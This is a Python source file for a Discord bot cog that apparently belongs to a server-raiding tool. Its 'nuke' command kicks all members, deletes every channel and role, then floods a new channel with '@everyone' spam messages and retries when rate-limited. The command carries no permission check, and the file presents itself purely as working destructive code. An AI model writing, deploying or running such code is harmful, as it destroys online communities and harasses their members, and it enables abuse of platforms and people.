import discord
from discord.ext import commands
import asyncio
from utils.server_utils import delete_all_roles, delete_all_channels, kick_all_members

class Nuke(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.is_nuking = False
        self.nuke_delay = 0.5 # Delay between message sends

    @commands.command(aliases=['n'])
    async def nuke(self, ctx, amount: int = 50, *, message: str = "@everyone nuked btw"):
        """Nuke server
        nuke 50 hello - Spam 50 messages
        nuke 100 - Use default message"""
        try:
            await ctx.message.delete()
        except (discord.HTTPException, discord.Forbidden):
            pass
            
        self.is_nuking = True
        
        try:
            # Kick all members first
            failed_kicks = await kick_all_members(ctx.guild)
            
            if not self.is_nuking:
                return
            
            # Delete all channels using utility function
            failed_channels = await delete_all_channels(ctx.guild)
            
            if not self.is_nuking:
                return
            
            # Delete all roles using utility function
            failed_roles = await delete_all_roles(ctx.guild)

            if not self.is_nuking:
                return
                
            # Create new channel
            channel = await ctx.guild.create_text_channel('nice server')
            
            # Send messages
            for _ in range(amount):
                if not self.is_nuking:
                    break
                    
                try:
                    await channel.send(message)
                    await asyncio.sleep(self.nuke_delay)
                except discord.HTTPException as e:
                    if e.status == 429:  # Rate limited
                        await asyncio.sleep(5)
                        continue
                    break
            
            # Report failed kicks
            if failed_kicks:
                failed_names = [name for name, _ in failed_kicks[:10]]
                more_text = f" and {len(failed_kicks) - 10} more" if len(failed_kicks) > 10 else ""
                await channel.send(f"Failed to kick members: {', '.join(failed_names)}{more_text}")
                    
            if failed_channels:
                failed_names = [name for name, _ in failed_channels]
                await channel.send(f"Failed to delete channels: {', '.join(failed_names)}")
                
            # Delete roles and report failures
            if failed_roles:
                await channel.send(f"Failed to delete roles: {', '.join(name for name, _ in failed_roles)}")
                
        except Exception as e:
            print(f"Error during nuke: {e}")
            
        self.is_nuking = False
            
    @commands.command(aliases=['snu'])
    @commands.has_permissions(administrator=True)  
    async def stopnuke(self, ctx):
        """Stop an ongoing nuke"""
        try:
            await ctx.message.delete()
        except (discord.HTTPException, discord.Forbidden):
            pass
        if self.is_nuking:
            self.is_nuking = False
            await ctx.send("Stopping nuke...",
                delete_after=self.bot.config_manager.auto_delete.delay if self.bot.config_manager.auto_delete.enabled else None)
        else:
            await ctx.send("No nuke in progress",
                delete_after=self.bot.config_manager.auto_delete.delay if self.bot.config_manager.auto_delete.enabled else None)

    def cog_unload(self):
        self.is_nuking = False

async def setup(bot):
    await bot.add_cog(Nuke(bot))